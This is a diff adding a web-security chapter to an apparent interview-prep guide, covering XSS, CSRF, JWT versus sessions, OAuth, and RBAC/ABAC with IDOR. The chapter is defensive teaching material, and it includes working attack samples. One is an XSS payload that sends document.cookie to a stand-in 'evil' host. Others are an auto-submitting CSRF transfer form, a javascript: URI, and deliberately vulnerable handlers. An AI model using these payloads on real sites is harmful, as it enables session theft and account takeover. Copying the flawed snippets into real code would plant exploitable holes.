@@ -3,7 +3,7 @@
 > **Principal Engineer · Technical Interview Series**
 > Experience: 7+ years | Target: Senior → Staff → Architect
 > Companies: Amazon · Google · Microsoft · Atlassian · Adobe · Uber · Airbnb · Salesforce · Walmart
-> Questions: 13 / 60+ covered
+> Questions: 18 / 60+ covered
 
 ---
 
@@ -2530,6 +2530,742 @@ At a Walmart-scale storefront, a third-party reviews API began responding in 25�
 
 ---
 
+## Topic 04 — Web & Application Security
+
+> Builds on Q23 (Node/API injection & JWT). Q23 covered server-side injection classes and API hardening; this topic covers the browser-facing attack surface (XSS, CSRF), the auth models themselves (sessions vs JWT, OAuth), access control (IDOR/BOLA), and transport/secrets. Every answer includes the explicit **trade-off** an interviewer is really probing for — there is no free security control.
+
+---
+
+### Q28 — XSS (Cross-Site Scripting): Stored vs Reflected vs DOM, and Why React Is Not a Free Pass
+
+*Asked at: Google · Meta · Atlassian · Salesforce · Adobe*
+
+#### Why Interviewers Ask This
+
+XSS is still #1 or #2 on nearly every real-world bug bounty payout list. Interviewers ask it because most React developers believe "React escapes everything, so I'm safe" — which is dangerously wrong. They want to see if you know the three XSS types, the exact React escape hatches that reintroduce it, and the defense-in-depth layers (CSP, cookie flags, sanitization) with their trade-offs.
+
+#### Beginner Answer
+
+> "XSS is when someone injects JavaScript into your site. You prevent it by escaping user input, and React does that automatically."
+
+**Score: 3 / 10 — Knows the definition, misses the taxonomy, the React escape hatches, CSP, and every trade-off**
+
+#### Senior Engineer Answer
+
+XSS = the browser executes attacker-controlled script **in the origin of your site**, giving it your users' cookies, localStorage, and DOM. Three delivery mechanisms:
+
+```text
+┌────────────────┬─────────────────────────────────────────────────────────┐
+│ Stored (persistent) │ Payload saved in DB (comment, profile bio), served to  │
+│                     │ every viewer. Highest impact — one injection, mass hit.│
+├────────────────┼─────────────────────────────────────────────────────────┤
+│ Reflected           │ Payload in the request (query param, URL), echoed back  │
+│                     │ in the response unescaped. Needs a crafted link + a     │
+│                     │ victim who clicks it.                                   │
+├────────────────┼─────────────────────────────────────────────────────────┤
+│ DOM-based           │ Never touches the server — client JS reads location.hash│
+│                     │ /document.referrer and writes it into the DOM. Invisible│
+│                     │ to server-side WAFs and logs.                           │
+└────────────────┴─────────────────────────────────────────────────────────┘
+```
+
+**Where React actually bites you — the escape hatches:**
+
+```jsx
+// SAFE — React escapes text children by default. This renders as literal text:
+<div>{userInput}</div>   // <script> becomes &lt;script&gt; — cannot execute
+
+// VULNERABLE 1 — dangerouslySetInnerHTML bypasses all escaping
+<div dangerouslySetInnerHTML={{ __html: userBio }} />  // stored XSS if userBio unsanitized
+
+// VULNERABLE 2 — href/src with a javascript: URI
+<a href={userProvidedUrl}>click</a>   // href="javascript:stealCookies()" executes on click
+
+// VULNERABLE 3 — spreading unvalidated props
+<div {...userControlledProps} />       // attacker sets dangerouslySetInnerHTML via props
+
+// VULNERABLE 4 — injecting into non-React DOM (refs, third-party widgets)
+ref.current.innerHTML = userInput;     // React's escaping never runs here
+```
+
+**Layer 1 — Sanitize when you MUST render HTML (rich text editors, CMS):**
+
+```jsx
+import DOMPurify from 'dompurify';
+
+// Allow-list based sanitization — strips <script>, on* handlers, javascript: URIs
+const clean = DOMPurify.sanitize(userBio, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
+  ALLOWED_ATTR: ['href'],
+});
+<div dangerouslySetInnerHTML={{ __html: clean }} />
+```
+
+**Layer 2 — Content Security Policy (defense-in-depth, assumes a payload got through):**
+
+```javascript
+// A strict CSP means even an injected <script> won't execute — no inline, no eval
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", "'nonce-<per-request-random>'"], // nonce, NOT 'unsafe-inline'
+    objectSrc: ["'none'"],
+    baseUri: ["'self'"],
+  },
+}));
+// Report-only mode first, collect violations, then enforce:
+// helmet.contentSecurityPolicy({ reportOnly: true, directives: { reportUri: '/csp-report' } })
+```
+
+**Layer 3 — Make token theft useless even if script runs:**
+
+```javascript
+// httpOnly cookie is invisible to document.cookie, so injected JS cannot exfiltrate it
+res.cookie('session', sid, { httpOnly: true, secure: true, sameSite: 'strict' });
+// This is WHY httpOnly matters: it turns a full account takeover into a limited-blast XSS
+```
+
+#### Trade-offs
+
+| Control | Advantage | Disadvantage (the real cost) |
+|---|---|---|
+| Rely on React auto-escaping only | Zero effort, covers the 95% text-rendering case | Silent false confidence — `dangerouslySetInnerHTML`, `href`, refs, and SSR still bypass it |
+| DOMPurify sanitization | Lets you safely support rich HTML (editors, markdown) | Adds ~45KB, must run on every render or memoize; allow-list drift breaks legitimate content |
+| Strict CSP with nonces | Neutralizes injected scripts even after a bypass | Breaks inline scripts/styles and many analytics/ad SDKs; nonce plumbing through SSR is fiddly |
+| `httpOnly` cookies over localStorage | Tokens un-stealable by injected JS | Now exposed to CSRF (see Q29) — you trade one attack class for another |
+| Sanitize on write (store clean) vs on read | Cheaper reads, single choke point | Corrupts original data; a sanitizer bug is permanent; hard to change allow-list retroactively |
+
+> **The core trade-off to say out loud:** sanitize-on-**read** keeps raw data intact and lets you fix sanitizer bugs retroactively, but pays CPU on every render; sanitize-on-**write** is faster to serve but permanently mutates stored data and can't recover from an over-aggressive filter. Most senior teams choose sanitize-on-read + strict CSP as defense-in-depth.
+
+#### Common Mistakes
+
+**1. Sanitizing on the client only:**
+
+```javascript
+// USELESS — attacker calls your API directly with curl, bypassing the browser entirely
+// Client-side sanitization is a UX nicety, NOT a security control. Sanitize server-side.
+```
+
+**2. Blocklisting instead of allow-listing:**
+
+```javascript
+// BROKEN — endless bypasses: <img onerror>, <svg onload>, <iframe srcdoc>, unicode tricks
+const clean = input.replace(/<script>/gi, '');
+// Allow-list what's permitted; never try to enumerate everything dangerous.
+```
+
+**3. `'unsafe-inline'` in CSP — silently defeats the whole policy:**
+
+```javascript
+scriptSrc: ["'self'", "'unsafe-inline'"] // now ANY injected inline <script> runs — CSP is theater
+```
+
+#### Follow-up Questions
+
+1. Why doesn't React protect you in Next.js SSR when interpolating into a `<script>` tag or JSON state? *(server-rendered HTML context differs from JSX escaping; use `serialize-javascript` / htmlescape for embedded JSON)*
+2. What's the difference between CSP `nonce` and `hash` sources, and when would you pick each?
+3. How does `Trusted Types` (CSP Level 3) eliminate DOM XSS at the sink level?
+4. A markdown renderer outputs HTML — where exactly do you sanitize in the pipeline?
+5. How does `SameSite=Strict` reduce XSS *impact* even though it targets CSRF?
+
+#### Real Production Example
+
+At an Atlassian-scale collaboration product, user-authored "page content" supported rich HTML and was rendered via `dangerouslySetInnerHTML`. A researcher submitted a page body containing `<img src=x onerror="fetch('//evil/'+document.cookie)">`. Because session tokens were in `httpOnly` cookies, `document.cookie` returned nothing useful — but the payload still made authenticated API calls as the viewing user (CSRF-style, riding their session), silently adding the attacker as an admin on any space a victim viewed.
+
+**Fix applied:** (1) DOMPurify with a strict allow-list on render, (2) a nonce-based CSP with `connect-src 'self'` so the `fetch('//evil/...')` was blocked at the network layer even after the DOM injection, (3) re-authentication (step-up) required for privilege-changing actions so a ridden session couldn't grant admin. Three independent layers — any one alone was insufficient.
+
+#### Performance Considerations
+
+- DOMPurify on large documents is O(n) over the DOM tree — memoize the sanitized output with `useMemo` keyed on the raw input, don't re-sanitize every render
+- CSP adds a response header (~200 bytes) and zero runtime cost — it's enforced by the browser, not your server
+- Nonce generation must use a CSPRNG (`crypto.randomBytes`), one per response — cache-busting means these responses can't be edge-cached with a static nonce
+
+#### Scalability Considerations
+
+- Centralize the CSP and sanitizer config in a shared middleware/library so every new service and micro-frontend inherits the same policy — divergent CSPs across teams are how gaps open
+- Ship CSP in `report-only` mode first behind a reporting endpoint; at scale you'll discover dozens of legitimate inline scripts you didn't know about before you can safely enforce
+- Trusted Types scales better than manual sink auditing in large codebases — it makes unsafe DOM sinks throw at runtime, turning a code-review problem into a build/runtime guarantee
+
+> **Interviewer Note:** Naming the three XSS types is Junior+. Knowing the four React escape hatches is Senior. Articulating the sanitize-on-read-vs-write trade-off and the httpOnly-trades-XSS-for-CSRF trade-off, plus a layered CSP story, is Staff/Principal signal.
+
+---
+
+### Q29 — CSRF: Why SameSite Cookies Changed Everything, and When You Still Need Tokens
+
+*Asked at: Google · Microsoft · Uber · Salesforce*
+
+#### Why Interviewers Ask This
+
+CSRF is the natural follow-up to "store JWTs in httpOnly cookies" (Q23/Q28) — the moment you use cookies for auth, you inherit CSRF risk. Interviewers want to know if you understand *why* CSRF works (ambient cookie authority), why `SameSite` mostly-but-not-entirely solves it, and the trade-off between cookies (CSRF-prone) and `Authorization` headers (XSS-prone).
+
+#### Beginner Answer
+
+> "CSRF is when a malicious site makes requests to your site on behalf of a logged-in user. You add a CSRF token to prevent it."
+
+**Score: 3 / 10 — Correct mechanism, but no understanding of SameSite, why tokens work, or the cookie-vs-header trade-off**
+
+#### Senior Engineer Answer
+
+CSRF exploits **ambient authority**: the browser automatically attaches your site's cookies to *any* request to your domain, even one triggered by a different site. The attacker never sees the response — they don't need to; the state-changing side effect already happened.
+
+```text
+1. Victim logs into bank.com  → browser stores session cookie
+2. Victim visits evil.com (still logged into bank.com in another tab)
+3. evil.com page contains:
+      <form action="https://bank.com/transfer" method="POST">
+        <input name="to" value="attacker"><input name="amount" value="10000">
+      </form>
+      <script>document.forms[0].submit()</script>
+4. Browser sends the POST to bank.com WITH the session cookie attached automatically
+5. bank.com sees a valid session → executes the transfer
+```
+
+**Defense 1 — `SameSite` cookie attribute (the modern first line):**
+
+```javascript
+res.cookie('session', sid, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'lax',   // cookie NOT sent on cross-site POST/PUT/DELETE, or cross-site iframes
+});
+// 'strict' → cookie sent ONLY for same-site requests (even top-level nav from another site drops it)
+// 'lax'    → sent on top-level GET navigations, blocked on cross-site POST/subrequests (good default)
+// 'none'   → always sent (requires Secure); needed for legitimate cross-site cookies (embeds, SSO)
+```
+
+**Defense 2 — Synchronizer token pattern (still needed for `SameSite=None` / legacy browsers):**
+
+```javascript
+// Server issues a random token tied to the session, delivered in a non-cookie channel
+app.get('/form', (req, res) => {
+  const csrfToken = crypto.randomBytes(32).toString('hex');
+  req.session.csrfToken = csrfToken;      // stored server-side against the session
+  res.render('form', { csrfToken });      // embedded in the form as a hidden field / meta tag
+});
+
+app.post('/transfer', (req, res) => {
+  if (req.body._csrf !== req.session.csrfToken) return res.sendStatus(403); // attacker can't read it
+});
+// Works because evil.com CANNOT read the token (same-origin policy blocks reading the response)
+```
+
+**Defense 3 — Double-submit cookie (stateless, for token-in-cookie APIs):**
+
+```javascript
+// Token set as a readable cookie AND echoed in a custom header by your JS.
+// evil.com can't read the cookie to copy it into the header (SOP), and can't set custom headers
+// cross-origin without triggering a CORS preflight your server rejects.
+```
+
+> **The key insight most miss:** APIs authenticated with an `Authorization: Bearer` header (not a cookie) are **inherently immune to CSRF** — the browser doesn't auto-attach headers, only cookies. CSRF is exclusively a cookie-auth problem. That's the whole trade-off with Q28's httpOnly recommendation.
+
+#### Trade-offs
+
+| Approach | Advantage | Disadvantage (the real cost) |
+|---|---|---|
+| Cookie auth (`httpOnly`) | Immune to XSS token theft; automatic, no client code | Inherits CSRF — needs SameSite + possibly tokens; awkward for mobile/native clients |
+| `Authorization: Bearer` header | Immune to CSRF; works uniformly for web/mobile/service-to-service | Token lives in JS-reachable storage → stealable by XSS; you manage attach/refresh logic |
+| `SameSite=Strict` | Strongest CSRF defense, zero token plumbing | Breaks legit cross-site entry (a link from email/Slack drops the cookie → user looks logged out) |
+| `SameSite=Lax` (default) | Blocks the dangerous cross-site POST while keeping top-level nav working | GET-based state changes are still exposed (which is why GETs must be side-effect-free) |
+| Synchronizer token (stateful) | Works everywhere, including `SameSite=None` and old browsers | Requires server-side session storage; breaks stateless/multi-instance unless token store is shared |
+| Double-submit (stateless) | No server storage; scales horizontally | Weaker if a subdomain is compromised (cookie can be overwritten); needs careful `Host-` cookie prefixing |
+
+> **The trade-off to say out loud:** "Cookie vs header auth is a choice between which attack you'd rather defend — cookies force you to handle CSRF, headers force you to handle XSS token theft. There is no option with neither. Most modern web apps pick `httpOnly` cookies + `SameSite=Lax` + CSRF tokens on mutating routes, because XSS-driven silent exfiltration is worse than CSRF, which SameSite already mostly kills."
+
+#### Common Mistakes
+
+**1. Using GET for state changes:**
+
+```javascript
+// BROKEN — SameSite=Lax still sends cookies on top-level GET navigation
+app.get('/account/delete', deleteAccount); // <img src="/account/delete"> triggers it
+// RULE: mutations must be POST/PUT/DELETE/PATCH, never GET
+```
+
+**2. Assuming a JSON `Content-Type` is protection:**
+
+```javascript
+// PARTIALLY true — a simple <form> can only send urlencoded/multipart, so requiring
+// application/json + rejecting others blocks form-based CSRF. But it is NOT sufficient alone:
+// combine with SameSite; don't rely on content-type checks as your only defense.
+```
+
+**3. Putting the CSRF token in a place evil.com can read:**
+
+```javascript
+// BROKEN — if the token is returned by a CORS-enabled GET endpoint that allows any origin,
+// the attacker fetches it first. The token's security depends on same-origin read protection.
+```
+
+#### Follow-up Questions
+
+1. Why is an `Authorization: Bearer` API immune to CSRF but a cookie-based one is not? *(browsers auto-send cookies, never custom headers)*
+2. How does `SameSite=Lax` interact with OAuth redirect flows and SSO? *(top-level POST callbacks can break — often need `None` for the auth cookie)*
+3. What is the `__Host-` cookie prefix and how does it harden double-submit? *(forces Secure + path=/ + no Domain, prevents subdomain overwrite)*
+4. Can CSRF exist without cookies at all? *(HTTP Basic auth and client TLS certs are also ambient — yes)*
+5. Why must the synchronizer token be per-session (or per-request) and unpredictable?
+
+#### Real Production Example
+
+A Salesforce-scale B2B app moved auth from `Authorization` headers to `httpOnly` cookies to close an XSS token-theft finding (Q28). Two weeks later a pentester demonstrated CSRF: a crafted page auto-submitted a POST to `/api/team/invite`, and because the session cookie rode along, it added an external attacker to victims' orgs. The header-based version had been immune to this — the "fix" for XSS opened CSRF.
+
+**Fix applied:** Kept the `httpOnly` cookie (XSS protection was still wanted) but added `SameSite=Lax`, a double-submit CSRF token validated on every mutating route via shared middleware, and a rule enforced in code review that all state changes use non-GET verbs. The lesson written into their security guidelines: "changing the auth transport changes your threat model — re-run the CSRF/XSS analysis every time."
+
+#### Performance Considerations
+
+- `SameSite` and CSRF token checks are effectively free (a string compare / attribute on the cookie) — no measurable latency
+- Synchronizer tokens require a session lookup per mutating request; if sessions live in Redis that's ~1ms — double-submit avoids this at the cost of the subdomain-trust weakness
+- Rotating CSRF tokens per-request (vs per-session) increases security marginally but defeats multi-tab usage and adds churn — per-session is the common balance
+
+#### Scalability Considerations
+
+- Stateful synchronizer tokens need a **shared** session store (Redis) across instances, or a user hitting a different instance fails validation — same constraint as Q23's rate limiter
+- Double-submit is the stateless-friendly choice for horizontally-scaled APIs, but demands `__Host-` prefixed cookies and strict subdomain hygiene at org scale
+- Standardize CSRF protection in a gateway/shared middleware so every new service inherits it — per-team implementations drift and leave GET-based or unprotected routes
+
+> **Interviewer Note:** Explaining ambient authority and the SameSite modes is Senior. Articulating that cookie-vs-header auth is a CSRF-vs-XSS trade-off with no free option — and that changing transport changes the threat model — is Staff/Principal signal.
+
+---
+
+### Q30 — Authentication: Sessions vs JWT, Refresh Token Rotation, and OAuth2/OIDC
+
+*Asked at: Amazon · Google · Uber · Airbnb · Okta*
+
+#### Why Interviewers Ask This
+
+"Sessions or JWT?" is the single most common auth debate, and most candidates parrot "JWT is stateless and scales better" without understanding what statelessness *costs* — chiefly, you can't instantly revoke a JWT. Interviewers want the honest trade-off, the refresh-token rotation pattern, and where OAuth/OIDC fit.
+
+#### Beginner Answer
+
+> "JWT is better than sessions because it's stateless — the server doesn't have to store anything, so it scales. You just verify the signature."
+
+**Score: 3 / 10 — Repeats the marketing line, ignores revocation, token theft, expiry, and the real trade-off**
+
+#### Senior Engineer Answer
+
+The core distinction is **where trust lives**:
+
+```text
+Session (stateful)                     JWT (stateless / self-contained)
+─────────────────                      ────────────────────────────────
+Client holds an opaque session ID      Client holds a signed token with claims
+Server stores session → user mapping   Server stores nothing; verifies signature
+Every request: DB/Redis lookup         Every request: local signature check (no I/O)
+Revoke = delete the row (instant)      Revoke = ??? (token valid until it expires)
+```
+
+**Sessions — the classic, still excellent choice:**
+
+```javascript
+// Session ID is opaque and random; all authority is server-side
+app.use(session({
+  store: new RedisStore({ client: redisClient }),   // shared across instances
+  secret: process.env.SESSION_SECRET,
+  cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 },
+}));
+// Logout / ban / password-change → redisClient.del(`sess:${id}`) → instant, global revocation
+```
+
+**JWT — the access + refresh token pattern (do NOT use a single long-lived JWT):**
+
+```javascript
+// Access token: short-lived (5–15 min), self-contained, checked with NO DB lookup
+const accessToken = jwt.sign({ sub: user.id, role: user.role }, ACCESS_SECRET,
+  { expiresIn: '15m', algorithm: 'HS256' });
+
+// Refresh token: long-lived (days), OPAQUE, stored server-side so it CAN be revoked
+const refreshToken = crypto.randomBytes(40).toString('hex');
+await redis.set(`refresh:${refreshToken}`, user.id, 'EX', 60 * 60 * 24 * 7);
+
+// This hybrid is the honest answer: short access tokens keep the "no lookup" win for
+// most requests, while the revocable refresh token restores the control sessions have.
+```
+
+**Refresh token rotation + reuse detection (the part that separates seniors):**
+
+```javascript
+// On each refresh, issue a NEW refresh token and invalidate the old one.
+// If an OLD (already-rotated) token is ever presented again → it was stolen and replayed:
+// revoke the ENTIRE token family (log the user out everywhere).
+app.post('/refresh', async (req, res) => {
+  const old = req.cookies.refresh;
+  const userId = await redis.get(`refresh:${old}`);
+  if (!userId) {                              // unknown or already-rotated token
+    await revokeAllTokensFor(suspectedUser);  // reuse detected → nuke the family
+    return res.sendStatus(401);
+  }
+  await redis.del(`refresh:${old}`);          // rotate
+  const next = issueRefresh(userId);
+  res.cookie('refresh', next, { httpOnly: true, secure: true, sameSite: 'strict' });
+});
+```
+
+**OAuth2 / OIDC — delegation, not a login form:**
+
+```text
+OAuth2  = authorization (delegated access to resources — "let App X read my calendar")
+OIDC    = authentication layer on top of OAuth2 (adds the id_token — "who is this user")
+
+Authorization Code + PKCE flow (the correct flow for SPAs & mobile in 2024+):
+  App → /authorize (redirect) → user logs in at provider → provider redirects back
+      with a one-time code → App exchanges code + PKCE verifier for tokens (server-side)
+  PKCE prevents code interception; the implicit flow is deprecated — never use it.
+```
+
+#### Trade-offs
+
+| Approach | Advantage | Disadvantage (the real cost) |
+|---|---|---|
+| Server sessions (opaque ID) | **Instant revocation**, small cookie, easy to reason about, no claims leakage | Stateful — needs shared Redis; a lookup per request; sticky-session/store availability concerns |
+| Single long-lived JWT | No DB lookup, trivially horizontal, self-describing | **Cannot revoke** before expiry — a stolen token is valid until it expires; logout is a lie |
+| Access + refresh (hybrid) | Keeps "no lookup" for most calls, restores revocation via the refresh store | More moving parts; refresh endpoint becomes a high-value target; rotation logic is subtle |
+| JWT with a denylist | Enables revocation | Reintroduces the per-request lookup you adopted JWT to avoid — you've rebuilt sessions, worse |
+| OAuth2/OIDC (delegated) | No password handling; SSO; provider owns MFA/breach detection | External dependency & latency; complex flows; misconfigured redirect URIs are a classic vuln |
+
+> **The trade-off to say out loud:** "JWT's headline benefit — no server state — *is* its headline cost: you can't revoke what you don't track. So the real production choice is rarely 'pure JWT'; it's sessions (accept the lookup, get instant revocation) or access+refresh (get the no-lookup win on the hot path, pay for revocation only at refresh time). Anyone proposing a single long-lived JWT for a security-sensitive app hasn't hit a 'we need to force-logout a compromised user *now*' incident yet."
+
+#### Common Mistakes
+
+**1. Storing a long-lived JWT in `localStorage`:**
+
+```javascript
+// DOUBLE FAIL — readable by any XSS (Q28), AND can't be revoked when stolen.
+localStorage.setItem('token', jwt); // 30-day expiry = 30-day account takeover window
+```
+
+**2. Not restricting the `alg` (algorithm confusion — links back to Q23):**
+
+```javascript
+jwt.verify(token, secret);                          // accepts alg:none / RS256→HS256 attacks
+jwt.verify(token, secret, { algorithms: ['HS256'] }); // FIXED — pin the algorithm
+```
+
+**3. Treating JWT expiry as a security boundary while ignoring theft:**
+
+```javascript
+// A 15-min access token still gives a 15-min window. Pair with refresh rotation + reuse
+// detection so a stolen token surfaces on the next legitimate refresh.
+```
+
+#### Follow-up Questions
+
+1. How do you force-logout a specific user across all their devices in a pure-JWT system? *(you can't cleanly — you need a denylist or short expiry + refresh revocation; this is the crux)*
+2. Why PKCE over the implicit flow for SPAs? *(no token in the URL fragment; protects the auth code from interception)*
+3. Where do you store the refresh token in a browser to minimize both XSS and CSRF risk? *(`httpOnly` cookie scoped to `/refresh` + SameSite + rotation)*
+4. What's in an OIDC `id_token` vs an OAuth2 `access_token`, and why must a resource server never trust an `id_token`?
+5. How does JWT signature verification differ between HS256 (shared secret) and RS256 (public/private) at scale? *(RS256 lets services verify with a public key without holding the signing secret)*
+
+#### Real Production Example
+
+An Airbnb-scale marketplace used 7-day JWTs in `localStorage` for "better UX — users stay logged in." A supplier's laptop was compromised via a malicious npm dependency (Q23 supply-chain) that read `localStorage` and exfiltrated the token. Because the JWT was self-contained and long-lived, the attacker had 7 days of valid API access, and the security team had **no mechanism to revoke it** — they had to rotate the signing secret, which force-logged-out every user on the platform simultaneously.
+
+**Fix applied:** Migrated to 15-minute access tokens + opaque refresh tokens in `httpOnly`/`SameSite=Strict` cookies with rotation and reuse detection. A stolen access token now expires in minutes; a stolen refresh token is caught on next rotation and revokes the whole family for that user only. Revocation became a targeted, one-user operation instead of a platform-wide outage.
+
+#### Performance Considerations
+
+- Sessions add a Redis lookup (~0.5–1ms) per authenticated request — usually negligible next to the actual business query, but it's a hard dependency on the store's availability
+- JWT verification is CPU (signature check), not I/O — HS256 is fast; RS256 is ~10x slower to verify but removes secret distribution — measure if you verify millions/sec
+- Refresh endpoints are called rarely (once per access-token lifetime) so their per-call cost (DB write for rotation) is amortized to near-zero on the hot path
+
+#### Scalability Considerations
+
+- The "JWT scales, sessions don't" claim is overstated: a Redis session store handles 100k+ lookups/sec trivially, and it's shared infra you likely already run for caching (Q25) and rate limiting (Q23)
+- JWT's genuine scaling win is **cross-service** — downstream microservices verify a signed token locally without calling an auth service; with RS256 they only need the public key (fetched from a JWKS endpoint)
+- At org scale, centralize auth in an identity provider (OIDC) so token issuance, MFA, rotation, and breach response live in one audited place instead of re-implemented per service
+
+> **Interviewer Note:** "JWT is stateless so it scales" is a Junior red flag if unqualified. Explaining that statelessness costs revocability, presenting the access+refresh hybrid with rotation and reuse detection, and knowing PKCE/OIDC is Staff/Principal signal.
+
+---
+
+### Q31 — Authorization: RBAC vs ABAC, and the IDOR/BOLA Bug That Passes Every Auth Check
+
+*Asked at: Google · Amazon · Salesforce · Atlassian · Uber*
+
+#### Why Interviewers Ask This
+
+Authentication (who you are) is well-trodden; **authorization** (what you may do) is where real breaches happen — Broken Object-Level Authorization (BOLA/IDOR) has been #1 on the OWASP API Security Top 10. Interviewers want to know if you can distinguish authN from authZ and whether you'd catch the bug where a valid, logged-in user accesses *another* user's data.
+
+#### Beginner Answer
+
+> "Authorization is checking if the user is allowed to do something. I check their role — if they're an admin, they can access admin routes."
+
+**Score: 3 / 10 — Only covers role-gating routes; completely misses object-level authorization (IDOR), the most common real-world authz bug**
+
+#### Senior Engineer Answer
+
+Two distinct questions, often conflated:
+
+```text
+Function-level authZ  → "Can this ROLE call this endpoint?"        (RBAC on the route)
+Object-level authZ    → "Can this USER access THIS SPECIFIC record?" (ownership check)
+```
+
+Most teams get the first right and forget the second — that's IDOR/BOLA.
+
+**The IDOR bug — passes authentication, passes role check, still a breach:**
+
+```javascript
+// VULNERABLE — user is authenticated AND has the 'user' role, so both checks pass...
+app.get('/api/invoices/:id', requireAuth, requireRole('user'), async (req, res) => {
+  const invoice = await Invoice.findById(req.params.id);  // NO ownership check!
+  res.json(invoice);
+});
+// Attacker logged in as themselves changes the URL: /api/invoices/12345 → reads YOUR invoice.
+// This is the #1 API breach class. The auth check is irrelevant — the record isn't theirs.
+
+// FIXED — scope every query by the authenticated principal
+app.get('/api/invoices/:id', requireAuth, async (req, res) => {
+  const invoice = await Invoice.findOne({ _id: req.params.id, ownerId: req.user.id });
+  if (!invoice) return res.sendStatus(404); // 404 not 403 — don't confirm the ID exists
+  res.json(invoice);
+});
+```
+
+**RBAC — roles map to permissions:**
+
+```javascript
+const permissions = {
+  admin:  ['invoice:read:any', 'invoice:delete:any', 'user:manage'],
+  member: ['invoice:read:own', 'invoice:create:own'],
+};
+function can(user, action) { return permissions[user.role]?.includes(action); }
+// Simple, auditable, but coarse — "read:own" still needs the ownership check at query time
+```
+
+**ABAC — decisions from attributes/policy (scales past role explosion):**
+
+```javascript
+// Attribute-Based: evaluate (subject, action, resource, environment) against a policy
+function canAccess(user, action, resource) {
+  if (user.role === 'admin') return true;
+  if (action === 'read'  && resource.ownerId === user.id) return true;
+  if (action === 'read'  && resource.teamId === user.teamId && user.teamRole === 'lead') return true;
+  return false;
+}
+// Externalize to a policy engine (OPA/Rego, Cedar) so policy changes don't require redeploys
+```
+
+**Defense-in-depth — enforce at the data layer, not just the controller:**
+
+```javascript
+// Row-level security (Postgres) / query middleware (Mongoose) makes ownership scoping
+// the DEFAULT, so a forgotten controller check can't leak data:
+invoiceSchema.pre(/^find/, function () {
+  if (this.getOptions().skipAuthScope) return;
+  this.where({ ownerId: this.getOptions().userId }); // every query auto-scoped
+});
+```
+
+#### Trade-offs
+
+| Model | Advantage | Disadvantage (the real cost) |
+|---|---|---|
+| RBAC (roles) | Simple, auditable, easy to reason about and grant/revoke | **Role explosion** — every new "manager of region X but only for product Y" needs a new role |
+| ABAC (attributes/policy) | Fine-grained, expresses ownership/context/time without new roles | Harder to audit ("who can access this?" is a policy-eval question, not a table lookup); slower |
+| Check in the controller | Explicit, close to the business logic | One forgotten route = IDOR breach; scattered across the codebase, easy to miss in review |
+| Enforce at data layer (RLS/middleware) | Secure-by-default — a missed controller check still can't leak | Harder to express complex cross-entity rules; risk of over-blocking legit admin/reporting queries |
+| Externalized policy engine (OPA) | Central audit, change policy without redeploy, consistent across services | Extra infra + latency per decision; policy language learning curve; a new failure mode to run |
+
+> **The trade-off to say out loud:** "RBAC vs ABAC is simplicity vs expressiveness. Start with RBAC because it's auditable; reach for ABAC (or a policy engine) only when you feel role explosion — proliferating roles like `regionX_productY_readonly`. And regardless of model, object-level ownership must be enforced at query time or ideally the data layer, because that's the check every IDOR breach proves teams forget."
+
+#### Common Mistakes
+
+**1. Checking authorization on the client / hiding the button:**
+
+```javascript
+// USELESS — the API is the security boundary. Hiding the delete button in the UI does nothing;
+// the attacker calls DELETE /api/users/5 directly. Authorize on the server, every request.
+{user.isAdmin && <DeleteButton />}   // UX only, NOT a control
+```
+
+**2. Returning 403 instead of 404 for objects the user can't access:**
+
+```javascript
+// 403 confirms the ID EXISTS → attacker enumerates valid IDs. Return 404 to avoid leaking existence.
+```
+
+**3. Trusting a role claim in a JWT without re-checking on privileged actions:**
+
+```javascript
+// A JWT minted when the user was an admin still says role:admin after they're demoted,
+// until it expires. For high-privilege actions, verify current role from source of truth.
+```
+
+#### Follow-up Questions
+
+1. What's the difference between IDOR and BOLA, and why is it OWASP API #1? *(same class; ubiquitous because ownership checks are easy to forget and invisible to authN tests)*
+2. When does RBAC's role explosion force a move to ABAC? Give a concrete example.
+3. How does Postgres Row-Level Security enforce object authZ below the application? What does it cost you?
+4. Why prefer 404 over 403 for unauthorized object access, and when is that guidance wrong? *(when non-existence itself must be distinguishable, e.g. idempotent deletes)*
+5. How would you audit "who can access resource X" under ABAC vs RBAC?
+
+#### Real Production Example
+
+A fintech (Salesforce-scale CRM integration) exposed `GET /api/v1/accounts/:accountId/statements`. Auth and a `requireRole('customer')` check both passed, but the handler never verified the `accountId` belonged to the caller. A researcher incremented `accountId` and pulled arbitrary customers' bank statements — a textbook BOLA. Every automated authentication test passed, because the attacker *was* properly authenticated; the missing check was authorization at the object level.
+
+**Fix applied:** (1) Every data query rescoped to `WHERE owner_id = $currentUser` via Mongoose query middleware so scoping is the default, not per-route; (2) Postgres row-level security on the statements table as a second, database-enforced layer; (3) an automated test harness that, for every object endpoint, logs in as user A and asserts user B's IDs return 404; (4) 403→404 for cross-tenant access to stop ID enumeration. Defense at controller, data, and test layers.
+
+#### Performance Considerations
+
+- Scoping queries by `ownerId` is essentially free if the column is indexed — and it should be indexed anyway; add a compound index on `(ownerId, _id)` for these lookups
+- Externalized policy engines (OPA) add a network hop per decision; mitigate by evaluating policy in-process (OPA as a sidecar/WASM) or caching decisions for a short TTL
+- Row-level security in Postgres adds a predicate to every query — usually negligible with the right index, but verify it doesn't defeat an index on complex policies
+
+#### Scalability Considerations
+
+- RBAC tables scale fine; it's the *number of distinct roles* that explodes organizationally — that's a modeling problem, not a throughput one
+- For microservices, centralize authorization policy (a shared policy engine or a well-defined authz service) so a rule change propagates everywhere instead of being re-coded per service — divergent authz logic is how one service becomes the weak link
+- Enforcing ownership at the data layer (RLS / ORM middleware) scales your *safety* as the team grows: new engineers can't accidentally ship an IDOR because the default query is already scoped
+
+> **Interviewer Note:** Distinguishing function-level from object-level authZ and immediately reaching for the ownership-scoped query is Senior. Explaining the RBAC-vs-ABAC simplicity/expressiveness trade-off, defense-in-depth at the data layer, and 404-vs-403 enumeration hardening — through a BOLA incident — is Staff/Principal signal.
+
+---
+
+### Q32 — Transport & Secrets: HTTPS/TLS, HSTS, and Never Committing a Secret Again
+
+*Asked at: Amazon · Microsoft · Google · Cloudflare*
+
+#### Why Interviewers Ask This
+
+Every control above assumes the channel and the keys are safe. Interviewers use this to check the "boring but fatal" layer: do you understand what TLS actually protects, why HSTS exists, and how secrets leak — because a committed AWS key or a downgrade attack undoes all your careful auth work.
+
+#### Beginner Answer
+
